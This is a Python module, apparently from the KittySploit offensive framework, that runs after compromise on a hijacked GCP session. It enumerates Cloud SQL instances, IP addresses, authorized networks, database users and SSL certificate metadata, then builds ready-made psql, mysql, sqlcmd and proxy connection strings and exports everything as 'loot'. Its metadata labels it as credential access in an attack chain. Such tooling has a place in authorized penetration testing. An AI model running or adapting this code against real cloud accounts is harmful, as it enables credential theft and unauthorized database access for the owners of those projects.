#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Cloud SQL Connection Info Loot",
        "description": "Extract Cloud SQL connection endpoints, users, SSL material, and proxy connection strings",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "cloud", "cloud-sql", "database", "credentials", "loot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 10,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    instance_name = OptString("", "Specific Cloud SQL instance; empty processes all instances", False)
    include_users = OptBool(True, "Enumerate database users", False)
    include_ssl_certs = OptBool(True, "Enumerate SSL client/server certificate metadata", False)
    max_instances = OptInteger(20, "Maximum instances to process", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            instances = self._resolve_instances()
            if not instances:
                print_warning("No Cloud SQL instances found")
                return self.module_result(success=True, data={"instances": []})

            max_instances = max(1, int(self.max_instances or 20))
            loot = []

            print_info(f"Looting connection info from {min(len(instances), max_instances)} instance(s)...")
            for item in instances[:max_instances]:
                name = str(item.get("name") or "").strip()
                if not name:
                    continue
                detail = self._gcp_cloud_sql_instance(project_id, name)
                instance = detail.get("instance") if detail.get("ok") else item
                entry = self._build_connection_info(project_id, name, instance or item)

                if self.include_users:
                    entry["users"] = self._gcp_cloud_sql_users(project_id, name)
                if self.include_ssl_certs:
                    entry["sslCerts"] = self._gcp_cloud_sql_ssl_certs(project_id, name)

                loot.append(entry)
                print_info(f"Instance: {name}")
                print_info(f"  connectionName: {entry.get('connectionName')}")
                for ip in entry.get("ipAddresses") or []:
                    print_info(f"  {ip.get('type')}: {ip.get('ipAddress')}")
                if entry.get("users"):
                    print_warning(f"  users: {len(entry['users'])}")
                if entry.get("authorizedNetworks"):
                    print_warning(f"  authorizedNetworks: {len(entry['authorizedNetworks'])}")
                print_info("-" * 80)

            payload = {"project_id": project_id, "instances": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Processed {len(loot)} instance(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Cloud SQL connection info loot failed: {exc}")
            return False

    def _resolve_instances(self):
        configured = str(self.instance_name or "").strip()
        if configured:
            return [{"name": configured}]
        body = self._gcp_body_dict("sql_instances")
        return list(body.get("items") or [])

    def _build_connection_info(self, project_id, name, instance):
        settings = instance.get("settings") or {}
        ip_config = settings.get("ipConfiguration") or {}
        database_version = str(instance.get("databaseVersion") or "").lower()
        connection_name = instance.get("connectionName") or f"{project_id}:{instance.get('region')}:{name}"
        ip_addresses = [
            {"type": ip.get("type"), "ipAddress": ip.get("ipAddress")}
            for ip in (instance.get("ipAddresses") or [])
        ]
        primary_ip = next((ip.get("ipAddress") for ip in ip_addresses if ip.get("type") == "PRIMARY"), "")
        return {
            "name": name,
            "databaseVersion": instance.get("databaseVersion"),
            "region": instance.get("region"),
            "state": instance.get("state"),
            "connectionName": connection_name,
            "ipAddresses": ip_addresses,
            "authorizedNetworks": ip_config.get("authorizedNetworks") or [],
            "requireSsl": ip_config.get("requireSsl"),
            "sslMode": ip_config.get("sslMode"),
            "databaseFlags": settings.get("databaseFlags") or [],
            "connectionStrings": {
                "cloud_sql_proxy": f"cloud-sql-proxy {connection_name}",
                "gcloud_ssh_tunnel": (
                    f"gcloud sql connect {name} --project={project_id} "
                    f"--database=<DB> --user=<USER>"
                ),
                "direct_hint": self._direct_connection_hint(database_version, primary_ip),
            },
        }

    @staticmethod
    def _direct_connection_hint(database_version, host):
        if not host:
            return ""
        if "postgres" in database_version:
            return f"psql -h {host} -U <USER> -d <DB>"
        if "mysql" in database_version or "mariadb" in database_version:
            return f"mysql -h {host} -u <USER> -p"
        if "sqlserver" in database_version:
            return f"sqlcmd -S {host} -U <USER>"
        return f"<client> -h {host}"
